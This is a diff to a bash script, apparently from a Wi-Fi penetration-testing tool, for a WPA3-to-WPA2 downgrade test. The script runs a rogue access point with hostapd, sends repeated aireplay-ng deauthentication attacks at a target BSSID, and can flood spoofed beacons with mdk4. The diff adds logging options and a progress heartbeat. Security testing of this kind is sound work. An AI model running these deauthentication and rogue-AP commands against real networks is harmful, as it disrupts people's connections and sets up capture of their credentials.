@@ -31,10 +31,12 @@ C_RESET="${ASTRA_COLOR_RESET:-}"
 
 # Inputs from Environment
 
-CATALYST="${CATALYST:-1}"INTERFACE="${MONITOR_INTERFACE:-}"
+CATALYST="${CATALYST:-1}"
+INTERFACE="${MONITOR_INTERFACE:-}"
 SSID="${GUEST_SSID:-}"
 TARGET_BSSID="${GUEST_BSSID:-}"
 CHANNEL="${GUEST_CHANNEL:-11}" # Default to 11 if not set
+SCAN_TIME="${SCAN_TIME:-60}"
 SESSION_DIR="${SESSION_DIR:-.}"
 EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
 ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
@@ -80,7 +82,11 @@ cleanup() {
 }
 trap cleanup EXIT
 
-hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" &
+else
+    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+fi
 HOSTAPD_PID=$!
 
 # 3. Execution of Catalyst
@@ -89,7 +95,11 @@ if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
     # Continuous deauth to prevent client from staying on WPA3 AP
     (
         while kill -0 $HOSTAPD_PID 2>/dev/null; do
-            aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
+            if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true
+            else
+                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
+            fi
             sleep 15
         done
     ) &
@@ -97,17 +107,36 @@ if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
 elif [[ "$catalyst_choice" == "2" ]]; then
     if command -v mdk4 &>/dev/null; then
         echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
-        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
+        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+            mdk4 "$INTERFACE" b -n "$SSID" -c 11 &
+        else
+            mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
+        fi
         CATALYST_PID=$!
     fi
 fi
 
 echo "[*] Downgrade environment active. Monitoring for client association..."
-"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 80 --status "Waiting for client fallback..."
+
+# Start dynamic telemetry heartbeat
+(
+    HEARTBEAT_ELAPSED=0
+    while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
+        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
+        [[ $PCT -gt 90 ]] && PCT=90
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
+        sleep 2
+        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
+    done
+) &
+TELEMETRY_PID=$!
+
 # In a real test, we would also run airodump-ng in background to capture the WPA2 handshake
 # as the client connects to our rogue AP using the known dummy passphrase.
 
-sleep 60
+sleep "$SCAN_TIME"
+
+kill "$TELEMETRY_PID" 2>/dev/null || true
 
 # 4. Reporting
 if grep -qi "authenticated" "$HOSTAPD_LOG"; then
@@ -137,5 +166,5 @@ else
         --rationale "Modern OSes may resist protocol downgrades if they have previously associated with the SSID using SAE (WPA3) and have cached that state."
 fi
 
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 exit 0
-xit 0
